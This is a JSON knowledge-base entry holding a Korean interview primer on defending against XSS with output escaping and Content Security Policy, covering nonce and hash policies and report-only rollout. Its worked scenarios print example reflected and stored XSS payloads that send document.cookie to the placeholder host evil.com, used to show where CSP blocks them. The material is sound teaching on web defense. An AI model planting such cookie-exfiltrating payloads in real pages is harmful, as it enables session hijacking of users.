{
  "id": "security/csp-xss-defense-interview-primer",
  "title": "CSP XSS Defense Interview Primer",
  "category": "security",
  "level": "intermediate",
  "summary": "이 primer는 CSP와 XSS 방어를 면접 답변으로 설명한다. output escaping이 1차 방어이고 CSP는 damage limit과 정책 enforcement라는 점을 강조한다.",
  "body_markdown": "# CSP XSS Defense Interview Primer\n\n## 한 줄 요약\n\nCSP(Content Security Policy)는 브라우저가 실행 가능한 script/source를 제한해 XSS 피해 범위를 줄이는 방어층이다. 신뢰하지 않은 값을 화면에 출력할 때의 1차 방어는 여전히 context-aware output escaping이며, CSP는 그 방어가 깨졌을 때 실행 경로를 줄이는 보조 안전망이다.\n\n## 미션 진입 증상\n\n사용자 이름, 리뷰, 알림 메시지처럼 사용자가 입력한 값이 HTML에 그대로 렌더링되면 script가 실행될 수 있다. 이 상황은 인증이나 인가 문제가 아니라 \"브라우저가 어떤 코드를 실행하게 되었는가\"의 문제다. 로그인한 사용자에게만 보이는 페이지여도 출력 escaping이 빠지면 XSS가 가능하고, 반대로 권한 체크가 잘 되어 있어도 CSP가 없으면 삽입된 script가 더 쉽게 실행될 수 있다.\n\n면접에서는 다음 순서로 말하면 섞이지 않는다.\n\n1. 입력값을 저장할 수 있더라도 출력 시점의 context에 맞게 escape한다.\n2. HTML sanitizer가 필요한 rich text는 허용 태그와 속성을 좁게 둔다.\n3. CSP로 inline script와 허용하지 않은 외부 source 실행을 제한한다.\n4. `report-only`로 위반 로그를 먼저 모아 운영 영향도를 확인한 뒤 enforce한다.\n\n## 핵심 mental model\n\nCSP는 서버의 권한 판단이 아니라 브라우저의 실행 정책이다. 대표적으로 `script-src`는 어떤 script를 실행할 수 있는지 제한하고, `object-src 'none'`이나 `base-uri 'none'`은 오래된 삽입 경로를 줄인다. nonce 기반 정책은 서버가 이번 응답에서 신뢰한 script tag에만 임의 값을 부여하고, 브라우저는 그 nonce가 없는 inline script를 실행하지 않는다.\n\nhash는 script 내용이 고정되어 있을 때 어울리고, nonce는 요청마다 HTML이 렌더링되는 서버 사이드 페이지에 자주 어울린다. `strict-dynamic`은 nonce나 hash로 신뢰된 script가 동적으로 로드하는 script 신뢰 모델을 표현할 수 있지만, 브라우저 호환성과 legacy allowlist 해석을 같이 확인해야 한다.\n\n면접 답변의 핵심은 \"CSP를 켜면 XSS가 사라진다\"가 아니다. 정확한 표현은 \"escaping과 sanitization으로 삽입을 막고, CSP로 실행 가능한 경로를 줄이며, report와 모니터링으로 정책을 점진적으로 강화한다\"이다.\n\n## 흔한 오해\n\n- 입력 검증으로 XSS가 끝나는 것이 아니다. 같은 값도 HTML text, attribute, URL, JavaScript context마다 escape 규칙이 다르다.\n- CSP는 인증 수단이 아니다. 누가 로그인했는지 확인하지 않고, 어떤 script/source를 브라우저가 실행할지 제한한다.\n- CSP는 인가 수단도 아니다. 사용자가 어떤 데이터에 접근할 수 있는지는 서버의 authorization 정책이 결정한다.\n- `unsafe-inline`을 남긴 채 \"CSP 적용\"이라고 말하면 핵심 방어 효과가 크게 줄어든다.\n- report-only는 보안 기능을 끈 모드가 아니라, 차단 전 호환성 문제와 누락된 source를 수집하는 rollout 단계다.\n\n## 면접 답변 골격\n\n\"XSS 방어는 한 겹으로 끝내지 않습니다. 먼저 출력 시점에 context별 escaping을 적용하고, rich text처럼 HTML 일부를 허용해야 한다면 sanitizer 정책을 좁게 둡니다. 그다음 CSP에서 `script-src`를 nonce/hash 중심으로 구성해 임의 inline script와 예상하지 못한 외부 script 실행을 제한합니다. 운영에서는 바로 enforce하지 않고 report-only로 위반 리포트를 수집해 정상 리소스와 공격성 삽입을 구분한 뒤 점진적으로 강화합니다.\"\n\n## 빠른 구분 질문\n\n| 질문 | 이 문서의 답 |\n|---|---|\n| \"로그인 사용자의 script 탈취를 막나?\" | 로그인 여부가 아니라 script 실행 정책을 제한한다 |\n| \"다른 사람 데이터 접근을 막나?\" | 아니다. 그것은 authorization/IDOR 영역이다 |\n| \"사용자 입력을 저장 전에 모두 제거하면 되나?\" | 저장 전 filtering만으로 부족하고 출력 context escaping이 필요하다 |\n| \"CSP report는 왜 보나?\" | 차단 전 정상 리소스 누락과 공격성 위반을 분리하기 위해 본다 |\n\n## 공격 → 방어 흐름을 코드로 보기\n\n\"CSP가 어떻게 XSS를 막는지\"를 구체적으로 말하려면 실제 payload가 어느 지점에서 차단되는지 알아야 한다.\n\n### 시나리오 1 — Reflected XSS\n\n공격자가 아래 URL을 피해자에게 보냈다고 가정한다.\n\n```\nhttps://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>\n```\n\n서버가 `q` 파라미터를 escape 없이 그대로 HTML에 넣으면 브라우저가 script를 실행한다.\n\n```html\n<!-- ❌ 서버가 escape 없이 렌더링한 결과 -->\n<p>검색어: <script>document.location='https://evil.com/?c='+document.cookie</script></p>\n```\n\n**1차 방어 — output escaping (서버):**\n\n```java\n// Spring MVC Thymeleaf: th:text는 자동으로 HTML entity escape를 적용한다\n// <script> → &lt;script&gt; 로 변환되어 브라우저가 텍스트로 렌더링\n<p th:text=\"${searchQuery}\">검색어</p>\n\n// 직접 escape가 필요한 경우 (예: 템플릿 외부)\nString safe = HtmlUtils.htmlEscape(userInput); // Spring 제공\n```\n\n**2차 방어 — CSP header (브라우저에서 차단):**\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'\n```\n\nescaping이 빠진 경우에도 브라우저는 위 정책에 따라 inline `<script>` 태그 실행을 거부한다. `script-src 'self'`는 현재 origin에서 서빙하는 `.js` 파일만 실행 허용이므로, HTML에 직접 삽입된 inline script는 nonce나 hash가 없는 한 차단된다.\n\n### 시나리오 2 — Stored XSS + nonce 기반 CSP\n\n댓글 기능처럼 저장된 값이 나중에 다른 사용자에게 출력되는 경우다.\n\n공격자가 댓글로 저장한 값:\n```\n좋은 글이네요 <img src=x onerror=\"fetch('https://evil.com/?c='+document.cookie)\">\n```\n\nescape 없이 렌더링하면 다른 사용자의 쿠키가 탈취된다.\n\n**CSP로 inline event handler를 막으려면:**\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'nonce-r4nd0m123'; object-src 'none'\n```\n\n서버는 매 응답마다 새 nonce를 생성해 신뢰하는 script tag에만 붙인다.\n\n```html\n<!-- 서버가 신뢰한 script: nonce 일치 → 실행됨 -->\n<script nonce=\"r4nd0m123\">\n  // 애플리케이션 코드\n</script>\n\n<!-- 공격자가 삽입한 onerror 핸들러: nonce 없음 → 차단됨 -->\n<img src=x onerror=\"fetch('https://evil.com/?c='+document.cookie)\">\n```\n\n`onerror` 같은 inline event handler는 `unsafe-hashes` 없이는 nonce로도 허용되지 않는다. 따라서 nonce 기반 CSP는 inline event handler 삽입 경로도 함께 막아준다.\n\n### \"CSP만 켜면 XSS 끝\"이라는 오해가 위험한 이유\n\nCSP는 **실행 경로를 줄이는** 방어층이지, 삽입 자체를 막지 않는다. 예를 들어:\n\n```http\nContent-Security-Policy: script-src 'self' 'unsafe-inline'\n```\n\n`unsafe-inline`이 들어간 순간 inline script 차단 효과가 사라진다. 현실에서는 레거시 코드 때문에 `unsafe-inline`을 빼기가 어려워 nonce/hash로 점진적으로 이전하는 전략이 필요하다.\n\n또한 CSP가 막더라도 공격자가 삽입한 HTML은 여전히 DOM에 존재한다. CSS injection이나 dangling markup처럼 script 없이 동작하는 공격은 CSP가 다루지 않는다.\n\n정리: **escaping이 1차, CSP는 escaping이 뚫렸을 때의 실행 차단이 목적**이다.\n\n## 스스로 점검\n\n- 레거시 프로젝트에서 `<script>`를 수십 군데 인라인으로 쓰고 있다. `unsafe-inline` 없이 CSP를 적용하려면 어떤 순서로 접근해야 할지 생각해봐.\n- `input` 저장 전 HTML 태그를 strip하면 XSS가 완전히 막히는 걸까? 어떤 context에서 여전히 취약할 수 있을지 생각해봐.\n\n## Safe Next Docs\n\n운영 rollout은 `csp-report-only-rollout-violation-feedback`, clickjacking과 CSP 연결은 `session-fixation-clickjacking-csp`로 이어진다.\n",
  "aliases": [
    "CSP XSS defense interview",
    "Content Security Policy XSS 답변",
    "CSP 면접 설명",
    "output escaping CSP 비교"
  ],
  "expected_queries": [
    "CSP는 XSS를 어떻게 막아?",
    "output escaping이랑 CSP는 어떤 관계야?",
    "nonce hash strict-dynamic을 면접에서 어디까지 말해야 해?"
  ],
  "symptoms": [
    "CSP만 켜면 XSS가 해결된다고 생각해요",
    "output escaping과 input filtering을 혼동해요",
    "report-only rollout 없이 바로 enforce하려 해요"
  ],
  "relations": {
    "prerequisites": [
      "security/xss-csrf-basics"
    ],
    "next_docs": [
      "security/csp-report-only-rollout-violation-feedback"
    ],
    "confusable_with": [
      "security/xss-csrf-basics",
      "security/csp-report-only-rollout-violation-feedback"
    ],
    "forbidden_for_queries": []
  },
  "learner_query_patterns": [],
  "metadata": {
    "schema_version": "v2",
    "created_at": "2026-05-24",
    "last_modified": "2026-05-31",
    "legacy_path": "knowledge/cs/contents/security/csp-xss-defense-interview-primer.md",
    "revision_history": []
  }
}